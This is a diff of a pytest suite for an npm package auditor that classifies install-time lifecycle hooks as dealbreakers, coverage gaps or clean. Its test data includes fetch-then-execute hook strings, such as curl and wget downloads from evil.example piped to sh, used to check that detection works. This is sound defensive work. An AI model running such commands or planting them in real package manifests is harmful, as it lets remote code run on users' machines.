@@ -30,6 +30,14 @@
 # (C5b), so a regex that matched nothing, or matched everything, fails this file.
 # Manifests are built from dicts through json.dumps rather than written as
 # literals; only C15 needs raw bytes, because its subject IS a broken file.
+# The classes added for the install-hook rework (C20-C27) close the gap between
+# those two directions: PUBLISHED_HOOKS holds install-script values copied verbatim
+# out of published manifests, each naming the package it came from, because every
+# one of them is a BENIGN shape the recogniser used to get wrong. Their provenance
+# is an installed tree — the bytes npm ships — surveyed over 1334 unique
+# (name, version) manifests; a tarball per one-line `scripts` value would be out of
+# proportion, so the package@version is named and the survey is reproducible
+# against any installed tree.
 #
 # Axes: which check trips × the scripts block's shape × manifest health × what the
 #       consumer receives (verdict, report shape, frames, persistability)
@@ -62,11 +70,45 @@
 #       file is not a dealbreaker (nothing executes it at install time)
 #   C9  reference normalization: `node ./setup.js` resolves to `setup.js`;
 #       `node lib/setup.js` needs the file AT `lib/setup.js`
-#   C10 FINDING, pinned not blessed: a non-node install hook contributes no
-#       reference at all, so `"install": "sh install.sh"` with install.sh ABSENT is
-#       not a dealbreaker — the same unanalysable install-time execution the check
-#       exists to catch, reached through a different interpreter
+#   C10 (was a pinned FINDING; now the contract) the interpreter is not the fact.
+#       `sh install.sh` / `bash ./install.sh` / `python3 install.sh` /
+#       `/bin/sh install.sh` / `./install.sh` (shebang, no interpreter word) with
+#       the target ABSENT is the same dealbreaker as C6. Until this class flipped,
+#       only a `node …` command yielded a reference at all, so every other
+#       interpreter walked through with an advisory warn
 #   C11 precedence: a manifest tripping both reports shell-pipe (checked first)
+# THE INSTALL-TIME HOOK SET, AND THE THIRD OUTCOME (the coverage gap)
+#   Why there are three outcomes and not two: an install hook whose target we
+#   cannot resolve is a statement about THIS ENGINE, not about the package, so it
+#   cannot carry the dealbreaker's accusation — measured over 227 published
+#   packages with lifecycle hooks, unresolvable install hooks are dominated by
+#   ordinary native-build tooling. It is still a coverage gap and must never reach
+#   SAFE, so it is a `critical` `install-coverage-gap` flag: one closed name, so a
+#   consumer refusing SAFE branches on one fact rather than on a list of gap kinds
+#   that grows every time a new one is found.
+#   C20 `prepare` / `prepublish` are BUILD-time, not install-time: npm never runs
+#       them for a registry tarball installed as a dependency, which is the only
+#       artifact resolve.py fetches. They name no install entry point and cannot
+#       be a dealbreaker — 11 of the 14 published packages the old check called
+#       DANGEROUS were this shape. Still reported via `lifecycle-scripts`
+#   C21 an unresolvable install hook (inline `-e` code; three native-build front
+#       ends) → no dealbreaker, one `critical` `install-coverage-gap` quoting hook
+#       and command. C21b is the pairing: a fully resolved hook leaves none
+#   C22 the legitimate non-node case that must not be condemned: `sh
+#       ./scripts/postinstall.sh` WITH the file shipped is clean and its reference
+#       is recorded — and the residue is stated, because FLAG reads js/ts only, so
+#       a shipped `.sh` is resolved but never analysed. Paired with a `.js` target
+#   C23 targets resolve the way the LOADER resolves them: `node scripts/postinstall`
+#       is `scripts/postinstall.js`, `node lib` is `lib/index.js` — node's rule,
+#       not a general one, so `sh scripts/postinstall` still misses
+#   C24 each command of a compound hook is classified separately (`node build.js;
+#       tsc …` → build.js resolved, tsc a gap). The old reference was `build.js;`
+#   C25 a fetch-then-execute shape SHELL_PIPE_PATTERNS misses (`curl -o f url && sh
+#       f`) lands anyway — as C6's fact, not as a seventh pattern
+#   C26 `entryPoints.install` order follows npm's run order, not str hash order
+#   C27 degenerate values (unbalanced quote, `$VAR` path, no operand, a bare
+#       operator, whitespace, a bare name that is a PATH lookup, a path into a
+#       SKIP_DIRS dir we never inventoried) → a gap, never a crash, never clean
 # THE SCRIPTS BLOCK — boundaries
 #   C12 `"scripts": {}` -> no dealbreaker, no lifecycle flag
 #   C13 no `scripts` key at all -> same, and entryPoints.install == []
@@ -102,6 +144,14 @@
 # the answer was provenance (no real manifest was in the file at all: C5b), the
 # suppression pairing (C4's control run), and the persistability of a report no
 # _report() call ever assembled (C18).
+# Adversarial pass: 2026-07-25/install-hook — "what does the recogniser claim, and
+# what does it actually match?" -> C10 flipped, and the same question asked of the
+# rest produced C20-C27. Measuring first is what changed the answer: the check the
+# hole was in was ALSO calling 14 real published packages DANGEROUS (whatwg-url,
+# lru-cache@7, tr46, @lezer/*, @google/genai, whatwg-encoding, protobufjs, msw),
+# so widening it interpreter-first would have multiplied a false-positive rate
+# nobody had measured. Now 0 of that corpus is a dealbreaker and `sh install.sh`
+# with the file absent is.
 from __future__ import annotations
 
 import json
@@ -121,7 +171,7 @@ from npmguard import report_store
 from npmguard.config import Settings
 from npmguard.errors import AuditIncompleteError
 from npmguard.events import AuditEmitter, sse_events
-from npmguard.inventory import analyze_inventory
+from npmguard.inventory import BUILD_TIME_HOOKS, INSTALL_TIME_HOOKS, analyze_inventory
 from npmguard.llm_runtime import build_npmguard_llm
 from npmguard.persistence import AuditSessionStore
 from npmguard.pipeline import AuditPipeline
@@ -144,6 +194,31 @@ PIPED_SCRIPTS = {
     "wget-file-then-sh": "wget -O /tmp/i.sh https://evil.example/i.sh && sh /tmp/i.sh",
     "wget-file-then-chmod": "wget -O /tmp/i https://evil.example/i && chmod +x /tmp/i",
     "upper-cased": "CURL HTTPS://EVIL.EXAMPLE/I.SH | SH",
+}
+# Install-hook commands copied VERBATIM out of published manifests, each with the
+# package it came from. These are not adversary text and not invented: every one is
+# a benign, widely-installed package, and every one is here because the recogniser
+# used to get it wrong (C20-C24). Provenance is the installed tree — the bytes npm
+# actually ships — surveyed over 1334 unique (name, version) manifests, 227 of them
+# declaring a lifecycle hook. Committing those tarballs is out of proportion for a
+# one-line `scripts` value, so the package@version is named instead and the survey
+# is reproducible against any installed tree.
+PUBLISHED_HOOKS = {
+    # protobufjs@7.5.4 / @8.0.0 — ships scripts/postinstall.js; node resolves it.
+    "extensionless-node-target": "node scripts/postinstall",
+    # msw@2.15.0 — inline code, which the old extractor read as a FILENAME.
+    "inline-node-code": "node -e \"import('./config/scripts/postinstall.js').catch(() => void 0)\"",
+    # node-pty@1.1.0 (the `||` branch of its install hook).
+    "native-rebuild": "node-gyp rebuild",
+    # keytar@7.9.0.
+    "prebuilt-binary": "prebuild-install || node-gyp rebuild",
+    # tree-sitter-bash@0.25.1.
+    "gyp-build": "node-gyp-build",
+    # @lezer/lr@1.4.9 — the old reference was the literal `build.js;`.
+    "compound-node-then-tsc": "node build.js; tsc src/constants.ts -d --outDir dist",
+    # whatwg-url@14.2.0's `prepare`: runs a script its own `files` keeps out of the
+    # tarball, which is legal because `prepare` never runs for a tarball dependency.
+    "dev-only-prepare": "node scripts/transform.js",
 }
 NEAR_MISSES = {
     "node-hook": BENIGN_HOOK,
@@ -404,20 +479,39 @@ async def test_install_reference_paths_are_normalized(tmp_path) -> None:
     assert misplaced.dealbreaker.check == "missing-install-script"
 
 
-async def test_non_node_install_hook_yields_no_reference_to_check(tmp_path) -> None:
-    """C10: FINDING, pinned rather than blessed. extract_script_file_ref only reads
-    a reference out of a `node …` command, so an install hook that runs an ABSENT
-    `sh install.sh` produces no reference and no dealbreaker — the identical
-    unanalysable install-time execution C6 exists to catch, through another
-    interpreter. All that survives is a `non-node-script` warn flag."""
+@pytest.mark.parametrize(
+    "command",
+    [
+        "sh install.sh",
+        "bash ./install.sh",
+        "python3 install.sh",
+        "/bin/sh install.sh",
+        "./install.sh",
+    ],
+)
+async def test_non_node_install_hook_with_an_absent_target_is_a_dealbreaker(
+    tmp_path, command: str
+) -> None:
+    """C10: the interpreter is NOT the fact the check turns on. This class used to
+    pin the opposite — `extract_script_file_ref` read a reference only out of a
+    `node …` command, so `"install": "sh install.sh"` with install.sh ABSENT
+    produced no reference, no dealbreaker and only an advisory warn: the identical
+    unanalysable install-time execution C6 exists to catch, walking through on a
+    different interpreter. The contract is now the FACT and not the spelling — a
+    hook that names a file the tarball does not ship is a dealbreaker whatever
+    reads it, an absolute interpreter path does not evade it, and neither does
+    dropping the interpreter so the shebang runs the file (`./install.sh`) — the
+    same fact with the interpreter written inside the file instead of beside it."""
     package = _write(
         tmp_path,
-        {"package.json": _manifest(scripts={"install": "sh install.sh"}), "index.js": SETUP_SOURCE},
+        {"package.json": _manifest(scripts={"install": command}), "index.js": SETUP_SOURCE},
     )
     inventory = await analyze_inventory(package)
-    assert inventory.entryPoints.install == []
-    assert inventory.dealbreaker is None
-    assert "non-node-script" in {flag.check for flag in inventory.flags}
+    assert inventory.entryPoints.install == ["install.sh"]
+    assert inventory.dealbreaker is not None
+    assert inventory.dealbreaker.check == "missing-install-script"
+    assert "'install'" in inventory.dealbreaker.detail
+    assert "'install.sh'" in inventory.dealbreaker.detail
 
 
 async def test_shell_pipe_wins_over_missing_install_script(tmp_path) -> None:
@@ -438,6 +532,301 @@ async def test_shell_pipe_wins_over_missing_install_script(tmp_path) -> None:
     inventory = await analyze_inventory(package)
     assert inventory.dealbreaker is not None
     assert inventory.dealbreaker.check == "shell-pipe"
+
+
+# --------------------------------------------------------------------------- #
+# THE INSTALL-TIME HOOK SET, AND THE COVERAGE GAP
+# --------------------------------------------------------------------------- #
+
+
+@pytest.mark.parametrize("hook", sorted(BUILD_TIME_HOOKS))
+async def test_build_time_hooks_name_no_install_entry_point(tmp_path, hook: str) -> None:
+    """C20: `prepare` and `prepublish` are not install-time. npm runs them for the
+    ROOT project on a bare `npm install`, on pack/publish, for a link install and
+    for a git dependency — never for a registry tarball installed as a dependency,
+    which is the only artifact resolve.py fetches (npm 12,
+    docs/content/using-npm/scripts.md, "Life Cycle Operation Order"). So a
+    reference they carry is not install-time execution and cannot be a dealbreaker.
+    This is not a softening, it is a measured false-positive fix: 11 of the 14
+    published packages the old check called DANGEROUS across 1334 installed
+    manifests were this exact shape — a `prepare` running a build script the
+    manifest's own `files` keeps out of the tarball. The hook is still REPORTED, so
+    the report does not lose the fact that it exists."""
+    package = _write(
+        tmp_path,
+        {
+            "package.json": _manifest(scripts={hook: PUBLISHED_HOOKS["dev-only-prepare"]}),
+            "index.js": SETUP_SOURCE,
+        },
+    )
+    inventory = await analyze_inventory(package)
+    assert inventory.entryPoints.install == []
+    assert inventory.dealbreaker is None
+    assert f"lifecycle hooks: {hook}" in next(
+        flag.detail for flag in inventory.flags if flag.check == "lifecycle-scripts"
+    )
+    assert "install-coverage-gap" not in {flag.check for flag in inventory.flags}
+
+
+@pytest.mark.parametrize(
+    "name", ["inline-node-code", "native-rebuild", "prebuilt-binary", "gyp-build"]
+)
+async def test_unresolvable_install_hook_is_a_located_coverage_gap(tmp_path, name: str) -> None:
+    """C21: the third outcome, which did not exist before. These four are REAL
+    published install hooks (see PUBLISHED_HOOKS) that no file in the tarball can
+    account for: inline `-e` code, and three native-build front ends. They are not
+    dealbreakers — condemning them would condemn every native addon on the registry
+    — but they are not clean either, so each leaves a `critical`
+    `install-coverage-gap` flag quoting the hook and the command. That flag is the
+    one closed fact a consumer can branch on to refuse SAFE."""
+    package = _write(
+        tmp_path,
+        {
+            "package.json": _manifest(scripts={"install": PUBLISHED_HOOKS[name]}),
+            "index.js": SETUP_SOURCE,
+        },
+    )
+    inventory = await analyze_inventory(package)
+    assert inventory.dealbreaker is None
+    gaps = [flag for flag in inventory.flags if flag.check == "install-coverage-gap"]
+    assert len(gaps) == 1, inventory.flags
+    assert gaps[0].severity == "critical"
+    assert "'install'" in gaps[0].detail
+    assert PUBLISHED_HOOKS[name] in gaps[0].detail
+
+
+async def test_a_fully_resolved_install_hook_leaves_no_coverage_gap(tmp_path) -> None:
+    """C21b: the pairing that stops C21 being vacuous — an install hook whose
+    target ships AND is a file type FLAG reads produces no gap flag at all. Without
+    this, a bug that flagged every package would pass C21."""
+    inventory = await analyze_inventory(_write(tmp_path, _hook_package(BENIGN_HOOK, hook="install")))
+    assert inventory.dealbreaker is None
+    assert {flag.check for flag in inventory.flags} == {"lifecycle-scripts"}
+
+
+async def test_a_shipped_shell_install_target_is_not_condemned_but_is_not_coverage(
+    tmp_path,
+) -> None:
+    """C22: the legitimate case the widened check must not break. `sh
+    ./scripts/postinstall.sh` WITH the file shipped is not a dealbreaker and the
+    reference is recorded — otherwise the fix would be a false-positive machine.
+    But `resolved` is a narrower claim than `analysed`: FLAG reads
+    SOURCE_FILE_TYPES only, so a `.sh` file reaches no model, and that residue is
+    named as a coverage gap pointing AT the file rather than counted as coverage.
+    Paired with the same hook over a `.js` target, which is real coverage."""
+    shell = await analyze_inventory(
+        _write(
+            tmp_path / "shell",
+            {
+                "package.json": _manifest(scripts={"install": "sh ./scripts/postinstall.sh"}),
+                "index.js": SETUP_SOURCE,
+                "scripts/postinstall.sh": "echo installing\n",
+            },
+        )
+    )
+    assert shell.dealbreaker is None
+    assert shell.entryPoints.install == ["scripts/postinstall.sh"]
+    gap = next(flag for flag in shell.flags if flag.check == "install-coverage-gap")
+    assert gap.file == "scripts/postinstall.sh"
+    assert "shell" in gap.detail
+
+    analysed = await analyze_inventory(
+        _write(
+            tmp_path / "analysed",
+            {
+                "package.json": _manifest(scripts={"install": "sh ./scripts/postinstall.js"}),
+                "index.js": SETUP_SOURCE,
+                "scripts/postinstall.js": SETUP_SOURCE,
+            },
+        )
+    )
+    assert "install-coverage-gap" not in {flag.check for flag in analysed.flags}
+
+
+async def test_a_target_is_resolved_the_way_node_resolves_it(tmp_path) -> None:
+    """C23: the resolver has to agree with the loader that will actually run the
+    file, or it invents missing files. `node scripts/postinstall` executes
+    `scripts/postinstall.js` (verified by execution: `node dir/postinstall` loads
+    `postinstall.js`), and `node .` reads `main` out of the directory's
+    package.json. protobufjs@7.5.4 and @8.0.0 ship the first shape and were
+    DANGEROUS under the old exact-path match. Extension search is node's rule, not
+    a general one — `sh scripts/postinstall` gets no such favour, since sh would
+    not find it either. And only the options BEFORE the first operand decide
+    whether code came inline, so a `-e` belonging to the SCRIPT does not erase the
+    script."""
+    extensionless = await analyze_inventory(
+        _write(
+            tmp_path / "extensionless",
+            {
+                "package.json": _manifest(
+                    scripts={"postinstall": PUBLISHED_HOOKS["extensionless-node-target"]}
+                ),
+                "index.js": SETUP_SOURCE,
+                "scripts/postinstall.js": SETUP_SOURCE,
+            },
+        )
+    )
+    assert extensionless.dealbreaker is None
+
+    directory = await analyze_inventory(
+        _write(
+            tmp_path / "directory",
+            {
+                "package.json": _manifest(scripts={"postinstall": "node lib"}),
+                "index.js": SETUP_SOURCE,
+                "lib/index.js": SETUP_SOURCE,
+            },
+        )
+    )
+    assert directory.dealbreaker is None
+
+    script_flag = await analyze_inventory(
+        _write(
+            tmp_path / "script-flag",
+            {
+                "package.json": _manifest(scripts={"install": "node build.js -e production"}),
+                "index.js": SETUP_SOURCE,
+                "build.js": SETUP_SOURCE,
+            },
+        )
+    )
+    assert script_flag.entryPoints.install == ["build.js"]
+    assert "install-coverage-gap" not in {flag.check for flag in script_flag.flags}
+
+    shell = await analyze_inventory(
+        _write(
+            tmp_path / "shell",
+            {
+                "package.json": _manifest(scripts={"install": "sh scripts/postinstall"}),
+                "index.js": SETUP_SOURCE,
+                "scripts/postinstall.js": SETUP_SOURCE,
+            },
+        )
+    )
+    assert shell.dealbreaker is not None
+    assert shell.dealbreaker.check == "missing-install-script"
+
+
+async def test_each_command_in_a_compound_hook_is_classified_separately(tmp_path) -> None:
+    """C24: one hook can be several commands, and reading it as one word list gets
+    both halves wrong. @lezer/lr@1.4.9 ships `node build.js; tsc …`, whose old
+    reference was the literal `build.js;` — semicolon included, so no package could
+    ever contain it. Now `build.js` resolves AND the `tsc` command is a gap, which
+    is the honest reading of a hook that runs two programs."""
+    package = _write(
+        tmp_path,
+        {
+            "package.json": _manifest(
+                scripts={"postinstall": PUBLISHED_HOOKS["compound-node-then-tsc"]}
+            ),
+            "index.js": SETUP_SOURCE,
+            "build.js": SETUP_SOURCE,
+        },
+    )
+    inventory = await analyze_inventory(package)
+    assert inventory.dealbreaker is None
+    assert inventory.entryPoints.install == ["build.js"]
+    gaps = [flag for flag in inventory.flags if flag.check == "install-coverage-gap"]
+    assert len(gaps) == 1
+    assert "'tsc'" in gaps[0].detail
+
+
+async def test_a_fetch_then_execute_hook_the_pipe_patterns_miss_still_lands(tmp_path) -> None:
+    """C25: SHELL_PIPE_PATTERNS only spells out the `wget -O … && …` half of
+    fetch-then-execute; the curl spelling has no `|` and matches none of the six
+    (C2 covers what does match). It lands anyway, and not because a seventh pattern
+    was added: the second command hands `sh` a path the tarball does not contain,
+    which is the same fact as C6/C10. That is the point of resolving targets rather
+    than recognising attack strings — the shapes an alternation misses come out as
+    a dealbreaker or a gap, never as clean.
+
+    Hand-authored adversary text, as INPUT PROVENANCE explains for every offensive
+    literal in this file: the only real producers are in the banned corpus."""
+    package = _write(
+        tmp_path,
+        {
+            "package.json": _manifest(
+                scripts={"install": "curl -o /tmp/i.sh https://evil.example/i.sh && sh /tmp/i.sh"}
+            ),
+            "index.js": SETUP_SOURCE,
+        },
+    )
+    inventory = await analyze_inventory(package)
+    assert inventory.dealbreaker is not None
+    assert inventory.dealbreaker.check == "missing-install-script"
+    assert "/tmp/i.sh" in inventory.dealbreaker.detail
+
+
+async def test_install_references_are_ordered_by_hook_not_by_hash(tmp_path) -> None:
+    """C26: `entryPoints.install` is derived by iterating the install-time hooks, so
+    its order used to be frozenset iteration order over strings — which varies per
+    PROCESS under hash randomization (measured: five seeds, five different orders).
+    Two audits of identical bytes could therefore disagree on the order of this
+    field, on which missing reference the dealbreaker rationale names, and on the
+    hypothesize prompt, which renders this list verbatim (phases.py "## Entry
+    points"). The manifest here declares the hooks in the reverse of run order to
+    prove the output follows npm's order and not the manifest's.
+
+    The constant is asserted directly as well, and that is not a restatement: a
+    frozenset restores the defect while still yielding npm's order in 1 process out
+    of 6 (measured — the observable-order assertion below survived 1 of 8 runs
+    against that mutation), so the observable assertion alone is a flaky pin on a
+    non-flaky bug."""
+    assert INSTALL_TIME_HOOKS == ("preinstall", "install", "postinstall")
+    package = _write(
+        tmp_path,
+        {
+            "package.json": _manifest(
+                scripts={
+                    "postinstall": "node third.js",
+                    "install": "node second.js",
+                    "preinstall": "node first.js",
+                }
+            ),
+            "index.js": SETUP_SOURCE,
+            "first.js": SETUP_SOURCE,
+            "second.js": SETUP_SOURCE,
+            "third.js": SETUP_SOURCE,
+        },
+    )
+    inventory = await analyze_inventory(package)
+    assert inventory.entryPoints.install == ["first.js", "second.js", "third.js"]
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        'sh "unbalanced',
+        "sh $SCRIPT",
+        "sh ${npm_package_config_target}",
+        "node",
+        "&&",
+        "   ",
+        "install.sh",
+        "node_modules/.bin/patch-package",
+    ],
+)
+async def test_a_degenerate_hook_value_is_a_gap_and_never_a_crash(tmp_path, command: str) -> None:
+    """C27: the values that have no target to resolve at all — unbalanced quoting,
+    a path the shell computes at run time, an interpreter with no operand, an
+    operator on its own, whitespace, a bare name (a PATH lookup: npm puts
+    node_modules/.bin on PATH and the package root NOT on it, so `install.sh` alone
+    is not this package's file), and a path into a SKIP_DIRS directory, whose bytes
+    classify_files never inventoried — so "absent from files" would not mean absent
+    from the tarball, and calling it missing would be a false dealbreaker on
+    `patch-package`. None of them may raise, and none may pass as clean: whitespace
+    declares no command so there is nothing to run, and every other one is a gap.
+    This is the class that keeps the INVARIANT total — a value this module cannot
+    understand degrades to "we could not look", the only safe direction."""
+    package = _write(
+        tmp_path,
+        {"package.json": _manifest(scripts={"install": command}), "index.js": SETUP_SOURCE},
+    )
+    inventory = await analyze_inventory(package)
+    assert inventory.dealbreaker is None
+    assert inventory.entryPoints.install == []
+    checks = {flag.check for flag in inventory.flags}
+    assert ("install-coverage-gap" in checks) is bool(command.strip())
 
 
 # --------------------------------------------------------------------------- #
